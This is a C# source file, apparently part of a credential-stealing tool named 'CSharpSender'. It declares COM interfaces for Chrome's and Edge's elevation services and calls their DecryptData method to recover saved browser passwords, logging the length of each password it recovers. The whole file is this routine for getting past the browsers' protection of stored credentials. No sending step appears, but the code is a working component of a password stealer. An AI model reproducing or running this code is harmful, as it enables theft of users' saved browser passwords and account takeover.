using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Text;

namespace CSharpSender.ComInterfaces
{
    [ComImport]
    [Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IOriginalBaseElevator
    {
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
        void DecryptData([In, MarshalAs(UnmanagedType.LPWStr)] string encryptedData, out IntPtr decryptedData, out uint decryptedDataSize);
    }

    [ComImport]
    [Guid("1FCBE96C-1697-43AF-9140-2897C7C69767")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IEdgeElevatorFinal
    {
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
        void DecryptData([In, MarshalAs(UnmanagedType.LPWStr)] string encryptedData, out IntPtr decryptedData, out uint decryptedDataSize);
    }

    public static class ChromeComDecryptor
    {
        public static string DecryptWithCom(byte[] encryptedData, string browserName)
        {
            try
            {
                ExitForm.Log($"[COM] {browserName} attempting COM-based decryption");
                
                // Convert encrypted data to base64 string for COM interface
                string base64Data = Convert.ToBase64String(encryptedData);
                ExitForm.Log($"[COM] {browserName} encrypted data length: {encryptedData.Length}, base64: {base64Data.Substring(0, Math.Min(50, base64Data.Length))}...");
                
                // Create COM instance based on browser
                object comInstance = null;
                if (browserName.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
                {
                    var chromeClsid = new Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C");
                    comInstance = Activator.CreateInstance(Type.GetTypeFromCLSID(chromeClsid));
                }
                else if (browserName.Equals("Edge", StringComparison.OrdinalIgnoreCase))
                {
                    var edgeClsid = new Guid("1FCBE96C-1697-43AF-9140-2897C7C69767");
                    comInstance = Activator.CreateInstance(Type.GetTypeFromCLSID(edgeClsid));
                }
                
                if (comInstance == null)
                {
                    ExitForm.Log($"[COM] {browserName} failed to create COM instance");
                    return null;
                }
                
                ExitForm.Log($"[COM] {browserName} COM instance created successfully");
                
                // Call DecryptData method using direct interface casting
                IntPtr decryptedDataPtr = IntPtr.Zero;
                uint decryptedDataSize = 0;
                
                try
                {
                    if (browserName.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
                    {
                        var chromeElevator = (IOriginalBaseElevator)comInstance;
                        chromeElevator.DecryptData(base64Data, out decryptedDataPtr, out decryptedDataSize);
                    }
                    else if (browserName.Equals("Edge", StringComparison.OrdinalIgnoreCase))
                    {
                        var edgeElevator = (IEdgeElevatorFinal)comInstance;
                        edgeElevator.DecryptData(base64Data, out decryptedDataPtr, out decryptedDataSize);
                    }
                    
                    ExitForm.Log($"[COM] {browserName} COM decryption successful");
                }
                catch (Exception comEx)
                {
                    ExitForm.Log($"[COM] {browserName} COM decryption failed: {comEx.Message}");
                    ExitForm.Log($"[COM] {browserName} error details: {comEx.GetType().Name}");
                    return null;
                }
                
                if (decryptedDataPtr == IntPtr.Zero || decryptedDataSize == 0)
                {
                    ExitForm.Log($"[COM] {browserName} COM decryption returned no data");
                    return null;
                }
                
                // Copy decrypted data
                byte[] decryptedBytes = new byte[decryptedDataSize];
                Marshal.Copy(decryptedDataPtr, decryptedBytes, 0, (int)decryptedDataSize);
                
                // Clean up COM resources
                try
                {
                    Marshal.FreeCoTaskMem(decryptedDataPtr);
                    Marshal.ReleaseComObject(comInstance);
                }
                catch { }
                
                // Convert to string
                string result = Encoding.UTF8.GetString(decryptedBytes).TrimEnd('\0');
                ExitForm.Log($"[COM] {browserName} COM decryption successful, password length: {result.Length}");
                return result;
            }
            catch (Exception ex)
            {
                ExitForm.Log($"[COM] {browserName} COM decryption failed: {ex.Message}");
                return null;
            }
        }
    }
}
